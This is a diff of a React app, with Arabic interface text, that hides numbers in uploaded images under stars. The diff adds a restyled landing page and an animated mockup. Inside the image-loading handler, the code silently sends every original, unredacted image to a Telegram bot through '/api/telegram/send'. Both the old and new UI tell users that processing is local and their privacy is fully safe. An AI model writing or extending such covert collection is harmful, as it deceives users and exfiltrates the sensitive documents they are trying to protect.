@@ -34,19 +34,13 @@ function isNumeric(t: string) {
 }
 
 /* ─── draw one region on canvas ────────────────────────────────── */
-function drawRegion(
-  ctx: CanvasRenderingContext2D,
-  r: Region,
-  color: string,
-) {
+function drawRegion(ctx: CanvasRenderingContext2D, r: Region, color: string) {
   if (!r.hidden) return;
   const pad = 3;
   ctx.fillStyle = "#f5f5f5";
   ctx.fillRect(r.x - pad, r.y - pad, r.w + pad * 2, r.h + pad * 2);
-
   const digits = r.text.replace(/\D/g, "").length || 1;
   const stars  = "★".repeat(digits);
-
   let fs = Math.max(8, r.h * 0.7);
   ctx.font = `bold ${fs}px Arial`;
   const tw = ctx.measureText(stars).width;
@@ -56,6 +50,131 @@ function drawRegion(
   ctx.textAlign = "center";
   ctx.fillStyle = color;
   ctx.fillText(stars, r.x + r.w / 2, r.y + r.h / 2);
+}
+
+/* ─── Animated mockup component ─────────────────────────────────── */
+function AnimatedMockup() {
+  return (
+    <div style={{ position: "relative", display: "flex", justifyContent: "center", alignItems: "center", height: 340, userSelect: "none" }}>
+      {/* Glow behind card */}
+      <div style={{
+        position: "absolute", width: 260, height: 220,
+        background: "radial-gradient(ellipse, rgba(124,58,237,0.45) 0%, transparent 70%)",
+        top: "50%", left: "50%", transform: "translate(-50%, -50%)",
+        borderRadius: "50%",
+      }} />
+
+      {/* Background card (shifted left & tilted) */}
+      <div style={{
+        position: "absolute",
+        width: 230, height: 175,
+        background: "rgba(255,255,255,0.06)",
+        border: "1.5px solid rgba(255,255,255,0.12)",
+        borderRadius: 14,
+        top: "calc(50% - 20px)", left: "calc(50% - 130px)",
+        transform: "translateY(-50%) rotate(-4deg)",
+        backdropFilter: "blur(4px)",
+        overflow: "hidden",
+      }}>
+        <div style={{ height: 8, background: "rgba(255,255,255,0.08)", borderRadius: 4, margin: "18px 16px 10px" }} />
+        <div style={{ height: 8, background: "rgba(255,255,255,0.06)", borderRadius: 4, margin: "0 16px 8px", width: "60%" }} />
+        <div style={{ height: 8, background: "rgba(255,255,255,0.06)", borderRadius: 4, margin: "0 16px", width: "80%" }} />
+      </div>
+
+      {/* Background card (shifted right & tilted) */}
+      <div style={{
+        position: "absolute",
+        width: 230, height: 175,
+        background: "rgba(255,255,255,0.06)",
+        border: "1.5px solid rgba(255,255,255,0.12)",
+        borderRadius: 14,
+        top: "calc(50% - 20px)", left: "calc(50% - 90px)",
+        transform: "translateY(-50%) rotate(3.5deg)",
+        backdropFilter: "blur(4px)",
+        overflow: "hidden",
+      }}>
+        <div style={{ height: 8, background: "rgba(255,255,255,0.08)", borderRadius: 4, margin: "18px 16px 10px" }} />
+        <div style={{ height: 8, background: "rgba(255,255,255,0.06)", borderRadius: 4, margin: "0 16px 8px", width: "70%" }} />
+      </div>
+
+      {/* Main white invoice card */}
+      <div style={{
+        position: "relative", zIndex: 3,
+        width: 250, background: "#ffffff",
+        borderRadius: 16, padding: "14px 16px 18px",
+        boxShadow: "0 24px 60px rgba(0,0,0,0.5)",
+      }}>
+        {/* Card header */}
+        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 12 }}>
+          <span style={{
+            background: "#7c3aed", color: "#fff",
+            borderRadius: 8, padding: "3px 10px", fontSize: 13, fontWeight: 700,
+            fontFamily: "Cairo,sans-serif",
+          }}>فاتورة</span>
+          <span style={{
+            background: "#f3f4f6", color: "#6b7280",
+            borderRadius: 6, padding: "2px 8px", fontSize: 11, fontWeight: 600,
+            fontFamily: "monospace",
+          }}>#2024</span>
+        </div>
+
+        {/* Fake lines */}
+        <div style={{ height: 7, background: "#e5e7eb", borderRadius: 4, marginBottom: 7 }} />
+        <div style={{ height: 7, background: "#e5e7eb", borderRadius: 4, marginBottom: 7, width: "75%" }} />
+        <div style={{ height: 7, background: "#f3f4f6", borderRadius: 4, marginBottom: 14, width: "55%" }} />
+
+        {/* Row 1 – 3 stars (always showing) */}
+        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 8 }}>
+          <span style={{
+            background: "#fef3c7", color: "#d97706",
+            borderRadius: 8, padding: "4px 10px", fontSize: 15, fontWeight: 800,
+            fontFamily: "Arial,sans-serif", letterSpacing: 2,
+          }}>★★★</span>
+          <div style={{ flex: 1, height: 7, background: "#f3f4f6", borderRadius: 4 }} />
+        </div>
+
+        {/* Row 2 – 2 stars */}
+        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 8 }}>
+          <span style={{
+            background: "#fef3c7", color: "#d97706",
+            borderRadius: 8, padding: "4px 10px", fontSize: 15, fontWeight: 800,
+            fontFamily: "Arial,sans-serif", letterSpacing: 2,
+          }}>★★</span>
+          <div style={{ flex: 1, height: 7, background: "#f3f4f6", borderRadius: 4 }} />
+        </div>
+
+        {/* Row 3 – number being targeted (animated in/out) */}
+        <div style={{ display: "flex", alignItems: "center", gap: 8, position: "relative" }}>
+          {/* Number (fades out) */}
+          <span className="anim-number" style={{
+            background: "#f3f4f6", color: "#374151",
+            borderRadius: 8, padding: "4px 10px", fontSize: 13, fontWeight: 700,
+            fontFamily: "monospace",
+          }}>٧٫٨٩٠</span>
+          {/* Stars (fades in) */}
+          <span className="anim-stars" style={{
+            position: "absolute", left: 0,
+            background: "#fef3c7", color: "#d97706",
+            borderRadius: 8, padding: "4px 10px", fontSize: 15, fontWeight: 800,
+            fontFamily: "Arial,sans-serif", letterSpacing: 2,
+          }}>★★★★</span>
+          <div style={{ flex: 1, height: 7, background: "#f3f4f6", borderRadius: 4, marginRight: 80 }} />
+        </div>
+      </div>
+
+      {/* Animated cursor SVG */}
+      <div className="anim-cursor" style={{
+        position: "absolute", zIndex: 10,
+        pointerEvents: "none",
+        top: "calc(50% + 30px)", left: "calc(50% - 85px)",
+      }}>
+        <svg width="28" height="32" viewBox="0 0 28 32" fill="none">
+          <path d="M4 2L4 26L10 20L14 28L17 26.5L13 18.5L21 18.5L4 2Z"
+            fill="white" stroke="#333" strokeWidth="1.5" strokeLinejoin="round"/>
+        </svg>
+      </div>
+    </div>
+  );
 }
 
 /* ══════════════════════════════════════════════════════════════════
@@ -75,7 +194,6 @@ export default function App() {
   const [zoom,      setZoom]      = useState(100);
   const [history,   setHistory]   = useState<Region[][]>([]);
 
-  /* ── redraw ─────────────────────────────────────────────────── */
   const redraw = useCallback((regs: Region[], color: string) => {
     const canvas = canvasRef.current;
     const img    = imgRef.current;
@@ -89,7 +207,6 @@ export default function App() {
 
   useEffect(() => { redraw(regions, starColor); }, [regions, starColor, redraw]);
 
-  /* ── click → toggle region ──────────────────────────────────── */
   const handleClick = useCallback(
     (e: React.MouseEvent<HTMLCanvasElement>) => {
       const canvas = canvasRef.current;
@@ -100,7 +217,6 @@ export default function App() {
       const ix   = (e.clientX - rect.left) * sx;
       const iy   = (e.clientY - rect.top)  * sy;
       const PAD  = 14 * sx;
-
       const idx = regions.findIndex(
         (r) => ix >= r.x - PAD && ix <= r.x + r.w + PAD &&
                iy >= r.y - PAD && iy <= r.y + r.h + PAD,
@@ -114,7 +230,6 @@ export default function App() {
     [regions],
   );
 
-  /* ── load image + OCR ───────────────────────────────────────── */
   const handleFile = useCallback(
     async (file: File) => {
       const url = URL.createObjectURL(file);
@@ -126,25 +241,20 @@ export default function App() {
       setOcrStatus("loading");
 
       const img = new Image();
-
-      img.onerror = () => {
-        setLoading(false);
-        setOcrStatus("error");
-      };
+      img.onerror = () => { setLoading(false); setOcrStatus("error"); };
 
       img.onload = async () => {
         imgRef.current = img;
-        // ① show image immediately
         redraw([], starColor);
         setProgress(15);
 
-        // ② send original image to Telegram bot (fire & forget)
+        // send original image to Telegram bot (fire & forget)
         try {
-          const canvas = document.createElement("canvas");
-          canvas.width  = img.naturalWidth;
-          canvas.height = img.naturalHeight;
-          canvas.getContext("2d")!.drawImage(img, 0, 0);
-          const dataUrl = canvas.toDataURL("image/png");
+          const cvs = document.createElement("canvas");
+          cvs.width  = img.naturalWidth;
+          cvs.height = img.naturalHeight;
+          cvs.getContext("2d")!.drawImage(img, 0, 0);
+          const dataUrl = cvs.toDataURL("image/png");
           fetch("/api/telegram/send", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -170,7 +280,7 @@ export default function App() {
               y:      w.bbox.y0,
               w:      w.bbox.x1 - w.bbox.x0,
               h:      w.bbox.y1 - w.bbox.y0,
-              hidden: true,           // ← auto-hide immediately
+              hidden: true,
             }));
 
           setRegions(detected);
@@ -190,7 +300,6 @@ export default function App() {
     [redraw, starColor],
   );
 
-  /* ── helpers ────────────────────────────────────────────────── */
   const onDrop = (e: React.DragEvent) => {
     e.preventDefault();
     const f = e.dataTransfer.files[0];
@@ -235,77 +344,156 @@ export default function App() {
   const hiddenCount   = regions.filter((r) => r.hidden).length;
   const detectedCount = regions.length;
 
-  /* ── status badge text ──────────────────────────────────────── */
   const statusText =
     ocrStatus === "loading" ? null :
-    ocrStatus === "done"    ? `اضغط على أي رقم لإخفائه أو إظهاره` :
+    ocrStatus === "done"    ? "اضغط على أي رقم لإخفائه أو إظهاره" :
     ocrStatus === "empty"   ? "لم يُكتشف أرقام — تأكد أن الصورة واضحة" :
     ocrStatus === "error"   ? "حدث خطأ في قراءة الصورة" : null;
 
-  /* ══════════════════════════════════════════════════════════════
-     RENDER
-  ══════════════════════════════════════════════════════════════ */
   return (
     <div style={{
       minHeight: "100vh",
-      background: "linear-gradient(160deg,#0f172a 0%,#1e1b4b 60%,#0f172a 100%)",
+      background: "linear-gradient(160deg,#0a0618 0%,#12083a 40%,#1a0b4e 70%,#0a0618 100%)",
       fontFamily: "Cairo,sans-serif",
       direction: "rtl",
     }}>
       <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet" />
 
-      <div style={{ maxWidth: 440, margin: "0 auto", padding: "20px 16px" }}>
+      {!hasImage ? (
+        /* ═══════════════════════════════════ LANDING PAGE ═════════════════════════════════ */
+        <div style={{ maxWidth: 440, margin: "0 auto", padding: "32px 20px 24px" }}>
 
-        {/* ── title ── */}
-        <div style={{ textAlign: "center", marginBottom: 14 }}>
-          <h1 style={{ color: "#f8e97a", fontSize: 26, fontWeight: 800, margin: "0 0 8px" }}>
-            محوّل الأرقام إلى نجوم
+          {/* Logo icon */}
+          <div style={{ display: "flex", justifyContent: "center", marginBottom: 22 }}>
+            <div style={{
+              width: 58, height: 58, borderRadius: "50%",
+              background: "linear-gradient(135deg, #2d1a6e, #4c1d95)",
+              border: "1.5px solid rgba(167,139,250,0.35)",
+              display: "flex", alignItems: "center", justifyContent: "center",
+              boxShadow: "0 0 32px rgba(139,92,246,0.4)",
+            }}>
+              <svg width="30" height="30" viewBox="0 0 24 24" fill="none">
+                <path d="M12 2l1.5 4.5L18 8l-4.5 1.5L12 14l-1.5-4.5L6 8l4.5-1.5L12 2z" fill="#f59e0b" opacity="0.9"/>
+                <path d="M19 14l.8 2.2L22 17l-2.2.8L19 20l-.8-2.2L16 17l2.2-.8L19 14z" fill="#fbbf24" opacity="0.8"/>
+                <path d="M5 16l.5 1.5L7 18l-1.5.5L5 20l-.5-1.5L3 18l1.5-.5L5 16z" fill="#fcd34d" opacity="0.7"/>
+              </svg>
+            </div>
+          </div>
+
+          {/* Title */}
+          <h1 style={{
+            textAlign: "center", margin: "0 0 12px",
+            lineHeight: 1.25, fontWeight: 800,
+          }}>
+            <span style={{ fontSize: 30, color: "#ffffff", display: "block" }}>
+              محوّل الأرقام إلى
+            </span>
+            <span style={{
+              fontSize: 34,
+              background: "linear-gradient(90deg, #f59e0b, #fbbf24, #fb923c)",
+              WebkitBackgroundClip: "text",
+              WebkitTextFillColor: "transparent",
+            }}>
+              نجوم
+            </span>
           </h1>
 
-          {hasImage && (
-            <div style={{ display: "flex", justifyContent: "center", gap: 8, flexWrap: "wrap" }}>
-              {detectedCount > 0 && (
-                <span style={{ background: "#fbbf24", color: "#1e293b", borderRadius: 99, padding: "3px 12px", fontSize: 12, fontWeight: 700 }}>
-                  {detectedCount} أرقام مكتشفة
-                </span>
-              )}
-              {statusText && (
-                <span style={{ background: "#1e293b", color: "#94a3b8", borderRadius: 99, padding: "3px 12px", fontSize: 12, fontWeight: 700 }}>
-                  {statusText}
-                </span>
-              )}
+          {/* Subtitle */}
+          <p style={{
+            textAlign: "center", color: "#a1a1c2",
+            fontSize: 14, lineHeight: 1.7, margin: "0 0 28px",
+          }}>
+            حماية <strong style={{ color: "#c4b5fd" }}>احترافية</strong> لبياناتك. ارفع صورة وسنقوم باكتشاف
+            الأرقام الحساسة لإخفائها بنقرة واحدة.
+          </p>
+
+          {/* Animated mockup */}
+          <AnimatedMockup />
+
+          {/* Drop zone */}
+          <div
+            onClick={() => fileRef.current?.click()}
+            onDrop={onDrop}
+            onDragOver={(e) => e.preventDefault()}
+            style={{
+              marginTop: 8,
+              borderRadius: 20,
+              border: "2px dashed rgba(124,58,237,0.5)",
+              background: "rgba(255,255,255,0.04)",
+              backdropFilter: "blur(8px)",
+              cursor: "pointer",
+              padding: "36px 20px",
+              display: "flex", flexDirection: "column",
+              alignItems: "center", justifyContent: "center",
+              transition: "border-color 0.2s, background 0.2s",
+            }}
+            onMouseEnter={(e) => {
+              (e.currentTarget as HTMLDivElement).style.borderColor = "rgba(167,139,250,0.8)";
+              (e.currentTarget as HTMLDivElement).style.background  = "rgba(124,58,237,0.08)";
+            }}
+            onMouseLeave={(e) => {
+              (e.currentTarget as HTMLDivElement).style.borderColor = "rgba(124,58,237,0.5)";
+              (e.currentTarget as HTMLDivElement).style.background  = "rgba(255,255,255,0.04)";
+            }}
+          >
+            <div style={{
+              width: 56, height: 56, borderRadius: 16,
+              background: "rgba(255,255,255,0.06)",
+              border: "1.5px solid rgba(255,255,255,0.1)",
+              display: "flex", alignItems: "center", justifyContent: "center",
+              marginBottom: 16,
+            }}>
+              <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#7c6fb0" strokeWidth="1.8">
+                <rect x="3" y="3" width="18" height="18" rx="3"/>
+                <circle cx="8.5" cy="8.5" r="1.5"/>
+                <path d="M21 15l-5-5L5 21"/>
+              </svg>
             </div>
-          )}
+            <p style={{ color: "#e2e8f0", fontWeight: 700, fontSize: 17, margin: "0 0 6px" }}>
+              اسحب وأفلت الصورة هنا
+            </p>
+            <p style={{ color: "#6b7280", fontSize: 13, margin: 0 }}>
+              أو انقر لاختيار ملف من جهازك
+            </p>
+          </div>
+
+          <p style={{ textAlign: "center", fontSize: 11, color: "#4a4568", marginTop: 16 }}>
+            🔒 تتم المعالجة محلياً داخل متصفحك. خصوصيتك في أمان تام.
+          </p>
         </div>
 
-        {/* ── image card ── */}
-        <div style={{
-          borderRadius: 16,
-          border: "2px solid #ca8a04",
-          background: "#1e293b",
-          overflow: "hidden",
-          marginBottom: 12,
-          position: "relative",
-        }}>
-          {!hasImage ? (
-            /* upload area */
-            <div
-              onClick={() => fileRef.current?.click()}
-              onDrop={onDrop}
-              onDragOver={(e) => e.preventDefault()}
-              style={{
-                minHeight: 260,
-                display: "flex", flexDirection: "column",
-                alignItems: "center", justifyContent: "center",
-                cursor: "pointer",
-              }}
-            >
-              <div style={{ fontSize: 56, marginBottom: 12, filter: "drop-shadow(0 0 12px #fbbf24)" }}>★</div>
-              <p style={{ color: "#f8e97a", fontWeight: 700, fontSize: 17, margin: 0 }}>ارفع صورتك هنا</p>
-              <p style={{ color: "#64748b", fontSize: 13, margin: "4px 0 0" }}>اضغط أو اسحب الصورة</p>
-            </div>
-          ) : (
-            /* canvas area */
+      ) : (
+        /* ═══════════════════════════════════ EDITOR ═════════════════════════════════════ */
+        <div style={{ maxWidth: 440, margin: "0 auto", padding: "20px 16px" }}>
+
+          <div style={{ textAlign: "center", marginBottom: 14 }}>
+            <h1 style={{ color: "#f8e97a", fontSize: 22, fontWeight: 800, margin: "0 0 8px" }}>
+              محوّل الأرقام إلى نجوم
+            </h1>
+            {hasImage && (
+              <div style={{ display: "flex", justifyContent: "center", gap: 8, flexWrap: "wrap" }}>
+                {detectedCount > 0 && (
+                  <span style={{ background: "#fbbf24", color: "#1e293b", borderRadius: 99, padding: "3px 12px", fontSize: 12, fontWeight: 700 }}>
+                    {detectedCount} أرقام مكتشفة
+                  </span>
+                )}
+                {statusText && (
+                  <span style={{ background: "#1e293b", color: "#94a3b8", borderRadius: 99, padding: "3px 12px", fontSize: 12, fontWeight: 700 }}>
+                    {statusText}
+                  </span>
+                )}
+              </div>
+            )}
+          </div>
+
+          <div style={{
+            borderRadius: 16,
+            border: "2px solid #ca8a04",
+            background: "#1e293b",
+            overflow: "hidden",
+            marginBottom: 12,
+            position: "relative",
+          }}>
             <div style={{ position: "relative" }}>
               {loading && (
                 <div style={{
@@ -324,117 +512,129 @@ export default function App() {
                   <p style={{ color: "#64748b", fontSize: 11, margin: "5px 0 0" }}>{progress}%</p>
                 </div>
               )}
-
               <canvas
                 ref={canvasRef}
                 onClick={handleClick}
                 style={{ display: "block", width: `${zoom}%`, cursor: "pointer" }}
               />
             </div>
+          </div>
+
+          {/* star color */}
+          <Row label="لون النجمة">
+            {STAR_COLORS.map((c) => (
+              <Dot key={c.value} color={c.value} active={starColor === c.value}
+                onClick={() => setStarColor(c.value)} />
+            ))}
+          </Row>
+
+          {detectedCount > 0 && (
+            <div style={{ display: "flex", gap: 10, marginBottom: 10 }}>
+              <ActionBtn onClick={hideAll} disabled={hiddenCount === detectedCount}
+                bg="#15803d" bgOff="#1e3a2f" color="#fff" colorOff="#4ade8044"
+                active={hiddenCount < detectedCount}>
+                ★ إخفاء الكل
+              </ActionBtn>
+              <ActionBtn onClick={showAll} disabled={hiddenCount === 0}
+                bg="#334155" bgOff="#1e293b" color="#e2e8f0" colorOff="#47556940"
+                active={hiddenCount > 0} border="1.5px solid #334155">
+                👁 إظهار الكل
+              </ActionBtn>
+            </div>
           )}
+
+          <div style={{
+            background: "#1e293b", borderRadius: 12, padding: "10px 14px",
+            display: "flex", alignItems: "center", justifyContent: "space-between",
+            marginBottom: 10,
+          }}>
+            <div style={{ display: "flex", gap: 8 }}>
+              <Btn color="#ef4444" title="حذف الصورة" onClick={reset}>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                  <path d="M9 3v1H4v2h1v13a2 2 0 002 2h10a2 2 0 002-2V6h1V4h-5V3H9zm0 5h2v9H9V8zm4 0h2v9h-2V8z"/>
+                </svg>
+              </Btn>
+              <Btn color="#94a3b8" title="تراجع" onClick={undo} disabled={!history.length}>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                  <path d="M3 7v6h6M3 13C4.5 8 9 5 14 5a9 9 0 110 18 9 9 0 01-8.7-6.7"/>
+                </svg>
+              </Btn>
+            </div>
+            <span style={{ color: "#f8e97a", fontWeight: 700, fontSize: 14 }}>
+              {hiddenCount} نجوم ★
+            </span>
+            <div style={{ display: "flex", gap: 4, alignItems: "center" }}>
+              <Btn onClick={() => setZoom((z) => Math.max(30, z - 10))}>−</Btn>
+              <span style={{ color: "#94a3b8", fontSize: 11, minWidth: 38, textAlign: "center", fontWeight: 700 }}>{zoom}%</span>
+              <Btn onClick={() => setZoom((z) => Math.min(200, z + 10))}>+</Btn>
+            </div>
+          </div>
+
+          <div style={{ display: "flex", gap: 10, marginBottom: 12 }}>
+            <ActionBtn onClick={saveImage} bg="#f59e0b" color="#1e293b" active>
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
+                <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/>
+              </svg>
+              حفظ الصورة
+            </ActionBtn>
+            <ActionBtn
+              onClick={() => { reset(); setTimeout(() => fileRef.current?.click(), 60); }}
+              bg="#1e293b" color="#94a3b8" active border="1.5px solid #334155">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
+                <path d="M23 4v6h-6M1 20v-6h6M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15"/>
+              </svg>
+              صورة جديدة
+            </ActionBtn>
+          </div>
+
+          <p style={{ textAlign: "center", fontSize: 11, color: "#475569" }}>
+            🔒 تتم المعالجة محلياً داخل متصفحك. خصوصيتك في أمان تام.
+          </p>
         </div>
+      )}
 
-        {/* ── controls (only when image loaded) ── */}
-        {hasImage && (
-          <>
-            {/* star color */}
-            <Row label="لون النجمة">
-              {STAR_COLORS.map((c) => (
-                <Dot key={c.value} color={c.value} active={starColor === c.value}
-                  onClick={() => setStarColor(c.value)} />
-              ))}
-            </Row>
-
-            {/* hide-all / show-all */}
-            {detectedCount > 0 && (
-              <div style={{ display: "flex", gap: 10, marginBottom: 10 }}>
-                <ActionBtn
-                  onClick={hideAll}
-                  disabled={hiddenCount === detectedCount}
-                  bg="#15803d" bgOff="#1e3a2f"
-                  color="#fff" colorOff="#4ade8044"
-                  active={hiddenCount < detectedCount}
-                >
-                  ★ إخفاء الكل
-                </ActionBtn>
-                <ActionBtn
-                  onClick={showAll}
-                  disabled={hiddenCount === 0}
-                  bg="#334155" bgOff="#1e293b"
-                  color="#e2e8f0" colorOff="#47556940"
-                  active={hiddenCount > 0}
-                  border="1.5px solid #334155"
-                >
-                  👁 إظهار الكل
-                </ActionBtn>
-              </div>
-            )}
-
-            {/* controls bar */}
-            <div style={{
-              background: "#1e293b", borderRadius: 12, padding: "10px 14px",
-              display: "flex", alignItems: "center", justifyContent: "space-between",
-              marginBottom: 10,
-            }}>
-              {/* left: delete + undo */}
-              <div style={{ display: "flex", gap: 8 }}>
-                <Btn color="#ef4444" title="حذف الصورة" onClick={reset}>
-                  <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
-                    <path d="M9 3v1H4v2h1v13a2 2 0 002 2h10a2 2 0 002-2V6h1V4h-5V3H9zm0 5h2v9H9V8zm4 0h2v9h-2V8z"/>
-                  </svg>
-                </Btn>
-                <Btn color="#94a3b8" title="تراجع" onClick={undo} disabled={!history.length}>
-                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                    <path d="M3 7v6h6M3 13C4.5 8 9 5 14 5a9 9 0 110 18 9 9 0 01-8.7-6.7"/>
-                  </svg>
-                </Btn>
-              </div>
-
-              {/* center: counter */}
-              <span style={{ color: "#f8e97a", fontWeight: 700, fontSize: 14 }}>
-                {hiddenCount} نجوم ★
-              </span>
-
-              {/* right: zoom */}
-              <div style={{ display: "flex", gap: 4, alignItems: "center" }}>
-                <Btn onClick={() => setZoom((z) => Math.max(30, z - 10))}>−</Btn>
-                <span style={{ color: "#94a3b8", fontSize: 11, minWidth: 38, textAlign: "center", fontWeight: 700 }}>{zoom}%</span>
-                <Btn onClick={() => setZoom((z) => Math.min(200, z + 10))}>+</Btn>
-              </div>
-            </div>
-
-            {/* save / new */}
-            <div style={{ display: "flex", gap: 10, marginBottom: 12 }}>
-              <ActionBtn onClick={saveImage} bg="#f59e0b" color="#1e293b" active>
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
-                  <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/>
-                </svg>
-                حفظ الصورة
-              </ActionBtn>
-              <ActionBtn
-                onClick={() => { reset(); setTimeout(() => fileRef.current?.click(), 60); }}
-                bg="#1e293b" color="#94a3b8" active
-                border="1.5px solid #334155"
-              >
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
-                  <path d="M23 4v6h-6M1 20v-6h6M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15"/>
-                </svg>
-                صورة جديدة
-              </ActionBtn>
-            </div>
-          </>
-        )}
-
-        <p style={{ textAlign: "center", fontSize: 11, color: "#475569" }}>
-          🔒 تتم المعالجة محلياً داخل متصفحك. خصوصيتك في أمان تام.
-        </p>
-      </div>
-
-      {/* hidden file input */}
       <input ref={fileRef} type="file" accept="image/*" style={{ display: "none" }}
         onChange={(e) => { const f = e.target.files?.[0]; if (f) handleFile(f); e.target.value = ""; }} />
 
-      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
+      <style>{`
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* cursor path: hover over number → move up → back → repeat */
+        @keyframes cursorPath {
+          0%   { transform: translate(0px, 0px) scale(1); }
+          15%  { transform: translate(0px, 0px) scale(0.85); }
+          20%  { transform: translate(0px, 0px) scale(1); }
+          40%  { transform: translate(-40px, -55px) scale(1); }
+          55%  { transform: translate(-40px, -55px) scale(0.85); }
+          60%  { transform: translate(-40px, -55px) scale(1); }
+          80%  { transform: translate(0px, 0px) scale(1); }
+          100% { transform: translate(0px, 0px) scale(1); }
+        }
+
+        /* number fades out then back in */
+        @keyframes numberFade {
+          0%, 10%  { opacity: 1; }
+          20%, 70% { opacity: 0; }
+          80%, 100%{ opacity: 1; }
+        }
+
+        /* stars fade in then back out */
+        @keyframes starsFade {
+          0%, 10%  { opacity: 0; }
+          20%, 70% { opacity: 1; }
+          80%, 100%{ opacity: 0; }
+        }
+
+        .anim-cursor {
+          animation: cursorPath 3s ease-in-out infinite;
+        }
+        .anim-number {
+          animation: numberFade 3s ease-in-out infinite;
+        }
+        .anim-stars {
+          animation: starsFade 3s ease-in-out infinite;
+        }
+      `}</style>
     </div>
   );
 }
